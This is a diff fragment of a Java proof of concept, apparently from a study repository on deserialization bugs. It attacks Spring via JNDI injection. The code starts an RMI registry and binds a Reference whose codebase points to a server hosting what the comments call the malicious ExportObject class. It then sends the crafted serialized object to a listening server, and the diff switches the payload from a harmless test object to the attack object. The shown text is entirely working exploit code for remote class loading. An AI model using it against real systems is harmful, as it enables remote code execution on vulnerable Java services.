@@ -40,7 +40,7 @@ public class SpringPOC {
         Registry registry = LocateRegistry.createRegistry(1999);
         // 设置code url 这里即为http://http://127.0.0.1:8000/
         // 最终下载恶意类的地址为http://127.0.0.1:8000/com.github.ruanshengwei.javalang.serialization.deserialization.bug.spring.ExportObject.class
-        Reference reference = new Reference("com.github.ruanshengwei.javalang.serialization.deserialization.bug.spring.ExportObject", "com.github.ruanshengwei.javalang.serialization.deserialization.bug.spring.ExportObject", "http://127.0.0.1:8001/");
+        Reference reference = new Reference("ExportObject", "com.github.ruanshengwei.javalang.serialization.deserialization.bug.spring.ExportObject", "http://127.0.0.1:8001/");
         // Reference包装类
         ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
         registry.bind("Object", referenceWrapper);
@@ -62,8 +62,8 @@ public class SpringPOC {
         Socket socket = new Socket("127.0.0.1", 9999);
         System.out.println("Sending object to server...");
         ObjectOutputStream objectOutputStream = new ObjectOutputStream(socket.getOutputStream());
-        objectOutputStream.writeObject(new MyObject());
-//        objectOutputStream.writeObject(object);
+//        objectOutputStream.writeObject(new MyObject());
+        objectOutputStream.writeObject(object);
         objectOutputStream.flush();
         socket.close();
     }
